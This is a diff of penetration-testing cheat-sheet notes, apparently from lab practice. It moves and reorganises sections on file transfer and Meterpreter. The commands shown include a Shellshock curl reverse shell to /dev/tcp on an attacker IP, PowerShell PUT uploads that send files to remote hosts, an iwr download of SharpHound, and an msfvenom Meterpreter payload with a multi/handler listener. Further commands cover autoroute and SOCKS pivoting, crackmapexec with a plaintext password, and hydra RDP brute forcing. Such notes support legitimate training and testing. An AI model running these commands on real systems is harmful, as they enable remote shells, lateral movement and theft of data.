@@ -2818,15 +2818,11 @@ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bi
 
 For Reverse Shell: curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.175/4444 0>&1' http://192.168.151.87/cgi-bin/test/test.cgi
 
-Uploading file with iwr:
-Invoke-WebRequest -Uri "https://remote-server-address/path/on/remote/server/upload_endpoint" -Method PUT -InFile "C:\path\to\local\file"
-
 NOTE: Sometimes files with odd extensions, or that are too big: will fail to upload! In that case: compress the file (s) into zip first, then do it like this:
 
 Invoke-WebRequest -Uri "http://192.168.45.204:850/compressed.zip" -Method PUT -InFile ".\compressed.zip"
 
 SharpHound / BloodHound Notes: /usr/lib/bloodhound/resources/app/Collectors
-Downloading it on Windows Powershell: iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
 
 Executing it: 
 
@@ -2851,36 +2847,6 @@ Bloodhound Queries:
 Getting all computers: MATCH (m:Computer) RETURN m
 Getting all users: MATCH (m:Computer) RETURN m
 Finding all active sessions: MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
-
-Using Msfvenom to Make Meterpreter reverse shell:
-    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
-
-Transfer files to target use iwr.
-
-meterpreter:
-
-    sudo msfconsole -q
-    use multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST $ip_address
-    set LPORT 443
-    set exitonsession false
-    run -j
-
-
-Once session is opened: We can use multi/manage/autoroute and auxilliary/server/socks_proxy 
-
-    use multi/manage/autoroute
-    set session 1
-    
-run
-
-# Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
- 
-    use auxiliary/server/socks_proxy
-    set SRVHOST 127.0.0.1
-    set version 5
-    run -j
 
 Scanning smb with proxychains: proxychains -q crackmapexec smb 172.16.84.240-241 172.16.84.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
 
@@ -2960,7 +2926,7 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 	Password: password
 	root@assertion:/#     
 
- # Inspecting Processes To See Who And When Programs Are Being RUn
+ # Inspecting Processes To See Who And When Programs Are Being Rnn
 	
  	./pspy64
  
@@ -3083,4 +3049,36 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 	On kali machine
 	  	sudo python ./icmp_receiver.py
 
+# Moving Files On Windows
 
+	
+ 	Invoke-WebRequest -Uri "https://remote-server-address/path/on/remote/server/upload_endpoint" -Method PUT -InFile "C:\path\to\local\file"
+ 	iwr -uri http://192.168.119.5:80/SharpHound.ps1 -Outfile SharpHound.ps1
+
+# Meterpreter
+
+Using Msfvenom to Make Meterpreter reverse shell:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
+
+    sudo msfconsole -q
+    use multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST $ip_address
+    set LPORT 443
+    set exitonsession false
+    run -j
+
+
+	Once session is opened: We can use multi/manage/autoroute and auxilliary/server/socks_proxy 
+
+    use multi/manage/autoroute
+    set session 1
+    
+run
+
+	Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
+ 
+    use auxiliary/server/socks_proxy
+    set SRVHOST 127.0.0.1
+    set version 5
+    run -j
